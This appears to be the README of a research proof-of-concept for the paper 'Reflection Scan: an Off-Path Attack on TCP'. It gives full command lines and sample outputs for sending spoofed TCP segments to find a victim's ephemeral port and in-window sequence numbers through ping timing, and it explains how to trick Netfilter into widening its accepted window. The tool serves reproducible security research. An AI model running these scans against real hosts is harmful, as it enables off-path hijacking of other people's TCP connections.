@@ -1,0 +1,200 @@
+This proof of concept was used to obtain experimental results
+presented in the 'Reflection Scan: an Off-Path Attack on TCP'. The
+code is provided to allow reproduction of the experimental results and
+to provide a starting point for further experiments in different
+setups. The proof of concept is not intended to be fully automatic
+'fire and forget' TCP session hijacking tool. Some steps, that from
+the attack perspective do not introduce any fundamental difficulties,
+are omitted (determining window size, finding SND.NXT after in window
+sequence number is found, finding the second end point's SND.NXT).
+
+The user is expected to have a good understanding of the paper.
+Command line parameters may need to be tuned to a particular
+experimental setup. Preferably, the user should be able to sniff
+victim's machine network traffic to make sure TCP layer is receiving
+spoofed segments and responds to them in an expected way.
+
+In the examples below Alice is the target of spoofed traffic, Bob is
+her peer. The connection uses a server port 5455 and an ephemeral port
+11235. Environment variables A and B hold Alice's and Bob's IP
+addresses. C holds an IP address of a machine to which ping probes are
+sent. Ping probes must share at least one routing queue with segments
+reflected by Alice. Preferably, the pinged machine should be as close to
+the attacker as possible to reduce duration of the attack (in the
+paper, C was a router one hop beyond an edge router connecting Alice
+and the Attacker to the Internet).
+
+================================================================================
+Setup
+
+'make' compiles the code (libnet is required).
+
+The tool requires root privileges (to send spoofed IP packets and
+frequent ping probes).
+
+================================================================================
+Finding an ephemeral port number (Windows XP, Linux with Netfilter)
+
+The most important thing is to determine if, in a given setup, the
+attacker can detect traffic spikes caused by the reflection of a
+sequence of spoofed segments. The easiest way to do it, is to perform
+a port scan of a small range that contains an ephemeral port in use:
+
+./reflection_scan.py --alice_host=$A --bob_host=$B --bob_port=5455 \
+          --ping_destination=$C --scan_mode='port' --range_start=11230 \
+          --range_end=11240 --segment_cnt=30 --pings_per_query=3 \
+          --sequential_sweep
+
+The command sends 30 spoofed segments to each port in a range [11230,
+11240). For each probed port 3 pings are sent to C. In the
+'sequential_sweep' mode the tool does not try to determine a correct
+ephemeral port, but just prints ping results in a following form:
+
+[scanned port, lost pings, standard deviation, average RTT]
+11230 0 0.497 20.347
+11231 0 2.893 22.193
+11232 0 1.825 21.289
+11233 0 0.314 20.359
+11234 0 0.622 20.357
+11235 4 0.000 21.072        <------- loss ratio spike
+11236 0 4.121 23.269
+11237 0 4.193 22.668
+11238 0 2.913 21.820
+11239 0 2.379 22.573
+
+There should be a spike (not necessarily the only one) in loss ratio or
+in average RTT when a correct port is scanned. If there is no visible
+spike --segment_cnt and/or --pings_per_query can be increased (but the
+values, especially pings_per_query, should be kept as small as
+possible to reduce the attack duration). If this does not help, the
+sniffer should be used to determine that the victim indeed receives
+spoofed segments and responds to them only if a correct ephemeral port
+is set.
+
+Once the result for a single port is visible, the user can determine
+how many ports per query can be probed to still generate a visible
+spike:
+./reflection_scan.py --alice_host=$A --bob_host=$B --bob_port=5455 \
+          --ping_destination=$C --scan_mode='port' --range_start=10200 \
+          --range_end=12200 --segment_cnt=30 --pings_per_query=3 \
+          --steps_per_query=200 --sequential_sweep
+
+The command scans 200 ports per query, a spike is still visible:
+[scanned port range, lost pings, standard deviation, average RTT]
+10200-10399 0  0.478 20.414
+10400-10599 0  0.339 20.578
+10600-10799 0  1.798 22.121
+10800-10999 0  1.549 21.444
+11000-11199 0  1.402 21.606
+11200-11399 2  9.366 32.083       <------- loss ratio spike
+11400-11599 0  5.839 25.319
+11600-11799 0  1.669 21.327
+11800-11999 0  0.343 21.083
+12000-12199 0 10.496 35.578
+
+From the performance perspective it does not make sense to scan more than
+250 ports per query.
+
+Knowing the parameters that induce a visible spike, the user can try
+to automatically find an ephemeral port in the full range of 2^16 ports:
+./reflection_scan.py --alice_host=$A --bob_host=$B --bob_port=5455 \
+          --ping_destination=$C --scan_mode='port' --segment_cnt=30 \
+          --pings_per_query=3 --steps_per_query=200
+
+'sequential_sweep' mode is off: the tool repeatedly re-executes
+queries for which RTT spike was measured until a single query is
+left. When a range of ports is found, the tool searches for a correct
+port within the range. At the end, the port is printed to stdout.
+
+================================================================================
+Finding in window sequence number of the victim (Linux with Netfilter).
+
+It is recommended to first experiment to check that acknowledge number
+that lies within 'largest sender window seen' is indeed accepted and
+other values are dropped. A command below covers a small range of
+[1000000000, 1001000000] acknowledge numbers with values that differ
+by 66000 (--range_step parameter).
+
+./reflection_scan.py --alice_host=$A  --alice_port=11235 --bob_host=$B \
+          --bob_port=5455 --ping_destination=$C --scan_mode='ack' \
+          --segment_cnt=30  --pings_per_query=3  --range_start=1000000000 \
+          --range_end=1001000000 --range_step=66000 --sequential_sweep
+
+--range_step is for sure not smaller than 66000 (see the paper) and
+can be increased if a window used by the victim's peer is larger. As
+in case of an ephemeral port searching, an acceptable value should
+induce a RTT spike.
+
+The paper describes how Netfilter can be fooled to increase the value
+of 'maximum sender window seen'. To do it, execute:
+
+./reflection_scan.py --alice_host=$A  --alice_port=11235 --bob_host=$B \
+          --bob_port=5455 --ping_destination=$C --scan_mode='ack' \
+          --segment_cnt=1 --pings_per_query=1 --range_step=66000 \
+          --steps_per_query=1000000 --sequential_sweep
+
+Ignore results, the command is not really trying to find anything. The
+command covers the whole space of 2^32 acknowledge numbers with values
+that differ by 66000. Spoofed segments have window size set to 0xFFFF,
+one of the segments should be accepted by Netfilter and should
+increase 'maximum sender window seen' to the maximum value allowed by
+the scalling factor in use.
+
+Once the window is increased, scanning the full space should be very fast:
+
+./reflection_scan.py --alice_host=$A --alice_port=11235 --bob_host=$B \
+          --bob_port=5455 --ping_destination=$C --scan_mode='ack' \
+          --segment_cnt=30 --pings_per_query=3 --steps_per_query=20 \
+          --range_step=8388480
+
+--range_step is set to the maximum window allowed by the Bob's window
+scaling factor (see the paper). For maximum performance set
+steps_per_query to sqrt(2^32/range_step) (this ensures work is equally
+divided between an initial range scan and a subsequent sequential
+scan).
+
+================================================================================
+Finding in-window sequence number of the victim's peer (Windows XP or
+other system that closely follows RFC 793 processing rules).
+
+Again, it is recommended to first scan a limited range of sequence
+numbers that overlaps a window to make sure the changes in RTT are
+detectable. A command below covers a small range of [1000000000,
+100300000] sequence numbers with values that differ by 65535
+(--range_step parameter). For each value two acknowledge numbers that
+differ by 2^31 are probed.
+
+./reflection_scan.py --alice_host=$A  --alice_port=11235 --bob_host=$B \
+          --bob_port=5455 --ping_destination=$C --scan_mode='sqn' \
+          --segment_cnt=30  --pings_per_query=3 --range_start=1000000000 \
+          --range_end=1000300000 --range_step=65535 --sequential_sweep
+
+[scanned sequence number(ack), lost pings, standard deviation, average RTT]
+1000000000(       123) 4  0.000  19.956
+1000000000(2147483770) 4  0.000  33.670
+1000065535(       123) 4  0.000  20.219
+1000065535(2147483770) 0 26.579 101.550
+1000131070(       123) 2 18.021 180.806
+1000131070(2147483770) 4  0.000  20.552
+1000196605(       123) 0  3.152  24.414    <--------- loss ratio/RTT minimum
+1000196605(2147483770) 4  0.000  20.029
+1000262140(       123) 4  0.000  33.023
+1000262140(2147483770) 4  0.000  21.489
+
+--range_step should preferably be equal to the victim's window size
+(it can be smaller, but should not be larger). When in window sequence
+number with an acceptable acknowledge number is probed the smallest
+average RTT and loss ratio should be measured. If the minimum is not
+clearly visible, increase segment_cnt and/or pings_per_query.
+
+To scan the whole space of 2^32 sequence numbers use:
+
+./reflection_scan.py --alice_host=$A  --alice_port=11235 --bob_host=$B \
+          --bob_port=5455 --ping_destination=$C --scan_mode='sqn' \
+          --segment_cnt=30  --pings_per_query=3 --range_step=65535
+
+As explained in the paper, this scan is slow and less reliable than
+the scan that looks for a spike. Scanning several values at once
+is difficult and not handled by the PoC, so do not try to increase
+--steps_per_query.
+
